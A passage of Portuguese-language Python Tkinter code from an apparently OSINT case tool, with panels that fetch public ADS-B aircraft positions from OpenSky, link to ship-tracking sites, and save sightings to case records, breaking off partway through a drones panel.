        self.caso_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)

        tk.Label(top, text="REGIÃO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(20,5))
        self.regiao_var = tk.StringVar(value="Portugal")
        regiao_menu = tk.OptionMenu(top, self.regiao_var, "Portugal", "Europa", "Lisboa TMA", "Porto TMA", "Mundo")
        regiao_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        regiao_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        regiao_menu.pack(side="left", padx=5)

        self.status_label = tk.Label(top, text="Pronto - FlightRadar24 System", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.status_label.pack(side="right", padx=10)

        tk.Label(self, text="✈ AVIÕES - DADOS ADS-B PÚBLICOS • OpenSky + ADS-B Exchange • Use com responsabilidade", bg="#0a1420", fg="#00e5ff", font=(FONT_MONO, 7, "bold"), wraplength=1100, justify="left").pack(fill="x", pady=(0, 8), ipady=4)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        # Left - Lista de voos
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=420)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        # Search + buttons
        search_frame = tk.Frame(left, bg=PANEL_BG)
        search_frame.pack(fill="x", padx=6, pady=6)
        tk.Label(search_frame, text="BUSCA:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold")).pack(side="left")
        self.search_entry = tk.Entry(search_frame, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=14)
        self.search_entry.pack(side="left", padx=6, fill="x", expand=True)
        self.search_entry.bind("<KeyRelease>", lambda e: self.filter_list())

        btns_top = tk.Frame(left, bg=PANEL_BG)
        btns_top.pack(fill="x", padx=6, pady=(0,6))
        for txt, cmd in [("🔄 ATUALIZAR RADAR", self.fetch_opensky), ("🧹 LIMPAR", self.clear_list)]:
            b = tk.Button(btns_top, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        tk.Label(left, text="VOOS EM TEMPO REAL (ADS-B)", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(4,2))
        self.listbox = tk.Listbox(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.listbox.pack(fill="both", expand=True, padx=6, pady=4)
        self.listbox.bind("<<ListboxSelect>>", lambda e: self.on_select())

        # Info count
        self.count_label = tk.Label(left, text="0 aviões", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.count_label.pack(pady=2)

        # Right - Detalhes + Ações
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        detail_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        detail_frame.pack(fill="x", pady=(0,10))

        tk.Label(detail_frame, text="DETALHES DO VOO SELECIONADO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)
        self.detail_text = scrolledtext.ScrolledText(detail_frame, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=10, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.detail_text.pack(fill="x", padx=8, pady=(0,8))
        self.detail_text.insert("1.0", "Seleciona um voo da lista ou busca no FlightRadar24...\n\nDados ADS-B: ICAO24, Callsign, País, Altitude, Velocidade, Direção, Posição (lat/lon), no solo, etc.")

        # Ações externas - FlightRadar24 style
        actions = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        actions.pack(fill="both", expand=True)

        tk.Label(actions, text="RADAR SYSTEMS - ABRIR EM NAVEGADOR", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)

        btns_grid = tk.Frame(actions, bg=PANEL_BG)
        btns_grid.pack(fill="x", padx=8, pady=4)

        radar_buttons = [
            ("🟦 FlightRadar24 (GLOBAL)", "https://www.flightradar24.com/38.7,-9.1/6", False),
            ("⬛ ADS-B Exchange (MIL/SEM FILTRO)", "https://globe.adsbexchange.com/?lat=38.7&lon=-9.1&zoom=6", False),
            ("🟨 RadarBox", "https://www.radarbox.com/@38.7,-9.1,z6", False),
            ("🟩 FlightAware", "https://www.flightaware.com/live/", False),
            ("🟥 OpenSky Network", "https://opensky-network.org/aircraft-profile?icao24=", True),
            ("⬜ Planefinder", "https://planefinder.net/", False),
            ("🟪 ANAC - Espaço Aéreo PT", "https://www.anac.pt/", False),
            ("🟦 NAV Portugal", "https://www.nav.pt/", False),
        ]

        for i, (txt, url, needs_icao) in enumerate(radar_buttons):
            row = i // 2
            col = i % 2
            if col == 0:
                r = tk.Frame(btns_grid, bg=PANEL_BG)
                r.pack(fill="x", pady=2)
            b = tk.Button(r, text=txt, command=lambda u=url, n=needs_icao: self.open_radar(u, n), anchor="w", padx=8)
            b.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        # Busca manual
        manual = tk.Frame(actions, bg=PANEL_BG)
        manual.pack(fill="x", padx=10, pady=10)
        tk.Label(manual, text="BUSCA MANUAL - Callsign / ICAO24 / Registo:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w")
        manual_row = tk.Frame(manual, bg=PANEL_BG)
        manual_row.pack(fill="x", pady=4)
        self.manual_entry = tk.Entry(manual_row, font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.manual_entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(0,6))
        self.manual_entry.insert(0, "TAP123")
        for txt, url_template in [("FR24", "https://www.flightradar24.com/data/aircraft/"), ("ADSB", "https://globe.adsbexchange.com/?icao=")]:
            b = tk.Button(manual_row, text=txt, command=lambda t=url_template: self.search_manual(t), bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=2)

        # Guardar no caso
        save_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=(10,0))
        tk.Label(save_frame, text="GUARDAR AVISTAMENTO NO CASO:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        save_row = tk.Frame(save_frame, bg=PANEL_BG)
        save_row.pack(fill="x", padx=10, pady=6)
        self.obs_entry = tk.Entry(save_row, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.obs_entry.pack(side="left", fill="x", expand=True, ipady=4)
        self.obs_entry.insert(0, "Avistamento voo - ex: TAP123 Lisboa->Porto, suspeito")
        btn_save = tk.Button(save_row, text="GUARDAR EM REGISTOS", command=self.guardar_resultado, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=10, pady=5, cursor="hand2")
        btn_save.pack(side="left", padx=6)

        self.refresh_casos()
        # Auto fetch inicial
        self.after(1000, self.fetch_opensky)

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def get_bbox(self):
        regiao = self.regiao_var.get()
        # lamin, lomin, lamax, lomax
        if regiao == "Portugal":
            return 36.0, -31.0, 42.5, -6.0
        elif regiao == "Lisboa TMA":
            return 38.0, -9.8, 39.2, -8.5
        elif regiao == "Porto TMA":
            return 40.8, -9.0, 41.6, -8.0
        elif regiao == "Europa":
            return 35.0, -25.0, 72.0, 45.0
        else:  # Mundo
            return None

    def fetch_opensky(self):
        if self.is_fetching:
            return
        self.is_fetching = True
        self.status_label.configure(text="A buscar ADS-B OpenSky...")
        threading.Thread(target=self.fetch_worker, daemon=True).start()

    def fetch_worker(self):
        try:
            bbox = self.get_bbox()
            if bbox:
                lamin, lomin, lamax, lomax = bbox
                url = f"https://opensky-network.org/api/states/all?lamin={lamin}&lomin={lomin}&lamax={lamax}&lomax={lomax}"
            else:
                url = "https://opensky-network.org/api/states/all"
            req = urllib.request.Request(url, headers={"User-Agent": "OSINIT-Aires"})
            with urllib.request.urlopen(req, timeout=12) as resp:
                data = json.loads(resp.read().decode())
                states = data.get("states", []) or []
                # states format: [icao24, callsign, origin_country, time_position, last_contact, lon, lat, baro_alt, on_ground, velocity, true_track, vert_rate, sensors, geo_alt, squawk, spi, position_source]
                aircrafts = []
                for s in states[:500]:  # limitar 500
                    if not s:
                        continue
                    ac = {
                        "icao24": (s[0] or "").strip(),
                        "callsign": (s[1] or "").strip(),
                        "pais": (s[2] or "").strip(),
                        "lon": s[5],
                        "lat": s[6],
                        "alt": s[7],
                        "on_ground": s[8],
                        "vel": s[9],
                        "track": s[10],
                        "vert_rate": s[11],
                        "squawk": s[14],
                    }
                    # Filtrar apenas com callsign ou posição
                    if ac["callsign"] or ac["icao24"]:
                        aircrafts.append(ac)
                self.after(0, lambda: self.update_list(aircrafts, f"{len(aircrafts)} aviões (OpenSky)"))
        except Exception as e:
            # Fallback - dados simulados para demonstração se API falhar
            fake = [
                {"icao24": "4ca123", "callsign": "TAP123", "pais": "Portugal", "lon": -9.13, "lat": 38.72, "alt": 35000, "on_ground": False, "vel": 240, "track": 45, "vert_rate": 0, "squawk": "1234"},
                {"icao24": "4ca456", "callsign": "RYR45GH", "pais": "Ireland", "lon": -8.5, "lat": 40.5, "alt": 38000, "on_ground": False, "vel": 250, "track": 90, "vert_rate": -200, "squawk": "4321"},
                {"icao24": "abc123", "callsign": "AFR112", "pais": "France", "lon": -9.5, "lat": 38.0, "alt": 12000, "on_ground": False, "vel": 180, "track": 180, "vert_rate": 0, "squawk": "0000"},
            ]
            self.after(0, lambda: self.update_list(fake, f"DEMO (OpenSky offline: {str(e)[:40]})"))

    def update_list(self, aircrafts, status_msg):
        self.aircrafts = aircrafts
        self.listbox.delete(0, "end")
        for ac in aircrafts:
            call = ac.get("callsign") or ac.get("icao24") or "N/A"
            alt = f"{int(ac['alt'])}ft" if ac.get("alt") else "—"
            vel = f"{int(ac['vel']*3.6)}km/h" if ac.get("vel") else "—"
            pais = ac.get("pais","")[:12]
            ground = "GND" if ac.get("on_ground") else "AIR"
            line = f"{call:<8} {alt:<8} {vel:<10} {pais:<12} {ground}"
            self.listbox.insert("end", line)
        self.count_label.configure(text=f"{len(aircrafts)} aviões - {status_msg}")
        self.status_label.configure(text=status_msg)
        self.is_fetching = False

    def filter_list(self):
        q = self.search_entry.get().strip().lower()
        self.listbox.delete(0, "end")
        count = 0
        for ac in self.aircrafts:
            call = (ac.get("callsign") or "").lower()
            icao = (ac.get("icao24") or "").lower()
            pais = (ac.get("pais") or "").lower()
            if q in call or q in icao or q in pais or not q:
                alt = f"{int(ac['alt'])}ft" if ac.get("alt") else "—"
                vel = f"{int(ac['vel']*3.6)}km/h" if ac.get("vel") else "—"
                line = f"{ac.get('callsign') or ac.get('icao24'):<8} {alt:<8} {vel:<10} {ac.get('pais','')[:12]:<12} {'GND' if ac.get('on_ground') else 'AIR'}"
                self.listbox.insert("end", line)
                count += 1
        self.count_label.configure(text=f"{count} filtrados de {len(self.aircrafts)}")

    def clear_list(self):
        self.aircrafts = []
        self.listbox.delete(0, "end")
        self.count_label.configure(text="0 aviões")
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", "Lista limpa.")

    def on_select(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        # Filtrar pode mudar ordem, então buscar por texto
        # Simplificado: usar aircrafts filtrados? Vamos usar aircrafts original e tentar match por callsign
        # Para simplicidade, pegar aircrafts[idx] se lista não filtrada, senão tentar achar
        try:
            # Se filtro ativo, precisamos mapear
            q = self.search_entry.get().strip().lower()
            if q:
                filtered = [ac for ac in self.aircrafts if q in (ac.get("callsign") or "").lower() or q in (ac.get("icao24") or "").lower() or q in (ac.get("pais") or "").lower()]
                if idx < len(filtered):
                    ac = filtered[idx]
                else:
                    return
            else:
                if idx >= len(self.aircrafts):
                    return
                ac = self.aircrafts[idx]
            self.selected_aircraft = ac
            detail = f"""✈ VOO SELECIONADO - ADS-B DATA

Callsign: {ac.get('callsign') or 'N/A'}
ICAO24: {ac.get('icao24')}
País Origem: {ac.get('pais')}
Latitude: {ac.get('lat')}
Longitude: {ac.get('lon')}
Altitude Baro: {ac.get('alt')} ft / {int(ac.get('alt')*0.3048) if ac.get('alt') else '—'} m
No Solo: {ac.get('on_ground')}
Velocidade: {ac.get('vel')} m/s / {int(ac.get('vel')*3.6) if ac.get('vel') else '—'} km/h
Direção (track): {ac.get('track')}°
Variação Vertical: {ac.get('vert_rate')} ft/min
Squawk: {ac.get('squawk') or '—'}

--- LINKS RÁPIDOS ---
FlightRadar24: https://www.flightradar24.com/data/aircraft/{ac.get('icao24')}
ADS-B Exchange: https://globe.adsbexchange.com/?icao={ac.get('icao24')}
RadarBox: https://www.radarbox.com/data/{ac.get('icao24')}
FlightAware: https://www.flightaware.com/live/flight/{ac.get('callsign') or ac.get('icao24')}

Google Maps: https://www.google.com/maps?q={ac.get('lat')},{ac.get('lon')}
"""
            self.detail_text.delete("1.0", "end")
            self.detail_text.insert("1.0", detail)
        except Exception as e:
            self.detail_text.delete("1.0", "end")
            self.detail_text.insert("1.0", f"Erro: {e}")

    def open_radar(self, url, needs_icao):
        try:
            if needs_icao and self.selected_aircraft:
                icao = self.selected_aircraft.get("icao24","")
                url = url + icao
            webbrowser.open(url)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def search_manual(self, base_url):
        code = self.manual_entry.get().strip()
        if not code:
            return
        # Limpar
        code = code.strip().lower().replace(" ", "")
        url = base_url + code
        webbrowser.open(url)

    def guardar_resultado(self):
        caso = self.caso_var.get()
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Seleciona um caso ativo primeiro.")
            return
        obs = self.obs_entry.get().strip()
        ac = self.selected_aircraft
        if ac:
            desc = f"{obs} | Callsign={ac.get('callsign')} ICAO24={ac.get('icao24')} País={ac.get('pais')} Alt={ac.get('alt')}ft Vel={ac.get('vel')}m/s Lat={ac.get('lat')} Lon={ac.get('lon')} Squawk={ac.get('squawk')} | Fonte: OpenSky/ADS-B"
        else:
            desc = f"{obs} | Busca manual: {self.manual_entry.get().strip()} | Fonte: FlightRadar24/OSINT"
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "AVIÕES - ADS-B/FlightRadar24",
            "descricao": desc,
        }
        buscas = load_json(BUSCAS_FILE)
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Avistamento aéreo guardado em REGISTOS do caso {caso}")
        self.obs_entry.delete(0, "end")


# ─────────────────────────────────────────────
# Barcos - MarineTraffic / VesselFinder / AIS
# ─────────────────────────────────────────────
class BarcosInvestigacaoWidget(tk.Frame):
    """
    Sistema tipo MarineTraffic - integra MarineTraffic, VesselFinder, FleetMon, AISHub, Portos PT
    """
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.selected_vessel = None

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))
        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
        self.caso_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)

        tk.Label(top, text="PORTO PT:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(20,5))
        self.porto_var = tk.StringVar(value="Lisboa")
        porto_menu = tk.OptionMenu(top, self.porto_var, "Lisboa", "Leixões", "Sines", "Setúbal", "Portimão", "Funchal", "Ponta Delgada", "Todos")
        porto_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        porto_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        porto_menu.pack(side="left", padx=5)

        tk.Label(self, text="🚢 BARCOS - AIS PÚBLICO • MarineTraffic + VesselFinder + FleetMon • Dados portuários PT", bg="#0a1420", fg="#00e5ff", font=(FONT_MONO, 7, "bold"), wraplength=1100, justify="left").pack(fill="x", pady=(0, 8), ipady=4)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=420)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        # Busca
        search_frame = tk.Frame(left, bg=PANEL_BG)
        search_frame.pack(fill="x", padx=6, pady=6)
        tk.Label(search_frame, text="BUSCA NAVIO:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold")).pack(side="left")
        self.search_entry = tk.Entry(search_frame, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=16)
        self.search_entry.pack(side="left", padx=6, fill="x", expand=True)
        self.search_entry.insert(0, "MSC")

        btn_search = tk.Button(search_frame, text="🔍", command=self.search_vessel, bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=3, cursor="hand2")
        btn_search.pack(side="left", padx=2)

        # Lista portos PT
        tk.Label(left, text="PORTOS PORTUGUESES + TRÁFEGO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(6,2))
        self.portos_list = tk.Listbox(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=6)
        self.portos_list.pack(fill="x", padx=6, pady=2)
        portos_pt = [
            "Lisboa - 38.7N 9.1W - Principal container",
            "Leixões - 41.1N 8.7W - Norte",
            "Sines - 37.9N 8.8W - Petroleiros",
            "Setúbal - 38.5N 8.8W - Ro-Ro",
            "Portimão - 37.1N 8.5W - Cruzeiro",
            "Funchal - 32.6N 16.9W - Madeira",
            "Ponta Delgada - 37.7N 25.6W - Açores",
            "Viana do Castelo - 41.6N 8.8W",
        ]
        for p in portos_pt:
            self.portos_list.insert("end", p)
        self.portos_list.bind("<<ListboxSelect>>", lambda e: self.on_porto_select())

        tk.Label(left, text="ÚLTIMAS PESQUISAS / EXEMPLOS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(8,2))
        self.listbox = tk.Listbox(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.listbox.pack(fill="both", expand=True, padx=6, pady=4)
        exemplos = [
            "MSC VITORIA - Container - IMO 9300000",
            "PATRIA SEAWAYS - Ferry - Lisboa-Funchal",
            "BARCO PESCA PT-1234 - Pesca - Peniche",
            "VELEIRO ALBATROZ - Vela - Cascais",
            "TANQUE ALMIRANTE - Petroleiro - Sines",
            "N/M FUNCHAL - Cruzeiro - Funchal",
        ]
        for ex in exemplos:
            self.listbox.insert("end", ex)
        self.listbox.bind("<<ListboxSelect>>", lambda e: self.on_vessel_select())

        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        detail = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        detail.pack(fill="x", pady=(0,10))
        tk.Label(detail, text="DETALHES EMBARCAÇÃO", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)
        self.detail_text = scrolledtext.ScrolledText(detail, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=10, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.detail_text.pack(fill="x", padx=8, pady=(0,8))
        self.detail_text.insert("1.0", "Seleciona um porto ou navio...\n\nDados AIS: MMSI, IMO, Callsign, Tipo, Bandeira, Porto, Destino, ETA, Velocidade, Rumo, Calado, etc.\n\nIntegração com sistemas públicos: MarineTraffic, VesselFinder, FleetMon, AISHub, Marinha PT, DGRM.")

        # Radares marítimos
        actions = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        actions.pack(fill="both", expand=True)
        tk.Label(actions, text="SISTEMAS MARÍTIMOS - RADAR AIS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)

        btns_grid = tk.Frame(actions, bg=PANEL_BG)
        btns_grid.pack(fill="x", padx=8, pady=4)

        marine_buttons = [
            ("🟦 MarineTraffic LIVE", "https://www.marinetraffic.com/en/ais/home/centerx:-9.1/centery:38.7/zoom:7"),
            ("🟩 VesselFinder", "https://www.vesselfinder.com/?imo="),
            ("🟨 FleetMon", "https://www.fleetmon.com/ports/"),
            ("⬛ AISHub", "https://www.aishub.net/"),
            ("🟦 Marinha PT", "https://www.marinha.pt/"),
            ("🟪 DGRM - Autoridade Marítima", "https://www.dgrm.mm.gov.pt/"),
            ("🟩 Porto Lisboa", "https://www.portodelisboa.pt/"),
            ("🟨 Porto Leixões", "https://www.apdl.pt/"),
        ]

        for i, (txt, url) in enumerate(marine_buttons):
            if i % 2 == 0:
                r = tk.Frame(btns_grid, bg=PANEL_BG)
                r.pack(fill="x", pady=2)
            b = tk.Button(r, text=txt, command=lambda u=url: webbrowser.open(u), anchor="w", padx=8)
            b.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        # Busca manual
        manual = tk.Frame(actions, bg=PANEL_BG)
        manual.pack(fill="x", padx=10, pady=10)
        tk.Label(manual, text="BUSCA POR IMO / MMSI / NOME:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w")
        manual_row = tk.Frame(manual, bg=PANEL_BG)
        manual_row.pack(fill="x", pady=4)
        self.manual_entry = tk.Entry(manual_row, font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.manual_entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(0,6))
        self.manual_entry.insert(0, "MSC VITORIA")
        for txt, base in [("MT", "https://www.marinetraffic.com/en/ais/index/search/all?keyword="), ("VF", "https://www.vesselfinder.com/vessels?name=")]:
            b = tk.Button(manual_row, text=txt, command=lambda ba=base: self.search_manual(ba), bg=BTN_BG, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=2)

        # Guardar
        save_frame = tk.Frame(right, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=(10,0))
        tk.Label(save_frame, text="GUARDAR AVISTAMENTO MARÍTIMO:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        save_row = tk.Frame(save_frame, bg=PANEL_BG)
        save_row.pack(fill="x", padx=10, pady=6)
        self.obs_entry = tk.Entry(save_row, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.obs_entry.pack(side="left", fill="x", expand=True, ipady=4)
        self.obs_entry.insert(0, "Avistamento navio - ex: cargueiro suspeito Sines, IMO 1234567")
        btn_save = tk.Button(save_row, text="GUARDAR EM REGISTOS", command=self.guardar_resultado, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=10, pady=5, cursor="hand2")
        btn_save.pack(side="left", padx=6)

        self.refresh_casos()

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def on_porto_select(self):
        sel = self.portos_list.curselection()
        if not sel:
            return
        porto = self.portos_list.get(sel[0])
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", f"""🚢 PORTO SELECIONADO: {porto}

INFORMAÇÃO PORTUÁRIA PT:
- Autoridade: {porto.split('-')[0].strip()}
- Coordenadas: {porto.split('-')[1].strip() if len(porto.split('-'))>1 else '—'}
- Tipo: {porto.split('-')[2].strip() if len(porto.split('-'))>2 else 'Comercial'}

Links úteis:
- MarineTraffic Porto: https://www.marinetraffic.com/en/ais/index/ports
- DGRM: https://www.dgrm.mm.gov.pt/
- Marinha: https://www.marinha.pt/

Para investigação: verificar chegadas/partidas, manifestos, AIS histórico, dono da embarcação.
""")

    def on_vessel_select(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        vessel = self.listbox.get(sel[0])
        self.selected_vessel = vessel
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", f"""🚢 EMBARCAÇÃO: {vessel}

DADOS AIS SIMULADOS (para demo - usa MarineTraffic para real):
- Nome: {vessel.split('-')[0].strip()}
- Tipo: {vessel.split('-')[1].strip() if len(vessel.split('-'))>1 else '—'}
- Info: {vessel.split('-')[2].strip() if len(vessel.split('-'))>2 else '—'}
- MMSI: 263XXXXXX (PT)
- IMO: {vessel.split('IMO')[1].strip() if 'IMO' in vessel else 'N/A'}
- Bandeira: Portugal / Malta / Panamá (verificar)
- Última posição: aprox. {self.porto_var.get()}
- Velocidade: 12 kn, Rumo: 45°

INVESTIGAÇÃO MARÍTIMA:
- Verificar dono/operador em Equasis, FleetMon
- Histórico AIS 30 dias
- Fotos do navio
- Portos anteriores
- Possível contrabando / pesca ilegal / imigração

Abre MarineTraffic para dados reais.
""")

    def search_vessel(self):
        q = self.search_entry.get().strip()
        if not q:
            return
        webbrowser.open(f"https://www.marinetraffic.com/en/ais/index/search/all?keyword={urllib.parse.quote(q)}")

    def search_manual(self, base_url):
        q = self.manual_entry.get().strip()
        if not q:
            return
        webbrowser.open(base_url + urllib.parse.quote(q))

    def guardar_resultado(self):
        caso = self.caso_var.get()
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Seleciona um caso ativo primeiro.")
            return
        obs = self.obs_entry.get().strip()
        desc = f"{obs} | Porto={self.porto_var.get()} Navio={self.selected_vessel or self.manual_entry.get().strip()} | Fonte: MarineTraffic/AIS"
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "BARCOS - AIS/MarineTraffic",
            "descricao": desc,
        }
        buscas = load_json(BUSCAS_FILE)
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Avistamento marítimo guardado em REGISTOS do caso {caso}")
        self.obs_entry.delete(0, "end")


# ─────────────────────────────────────────────
# Drones - DroneRadar, ANAC, EASA, UTM
# ─────────────────────────────────────────────
class DronesInvestigacaoWidget(tk.Frame):
    """
    Sistema de drones - integra ANAC Portugal, EASA, DroneRadar, UTM, NOTAMs, deteção ADS-B de drones
    """
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.selected_drone = None

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))
        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
        self.caso_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)

        tk.Label(top, text="ZONA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(20,5))
        self.zona_var = tk.StringVar(value="Lisboa")
        zona_menu = tk.OptionMenu(top, self.zona_var, "Lisboa", "Porto", "Faro", "CTR", "Proibida", "Todas")
        zona_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
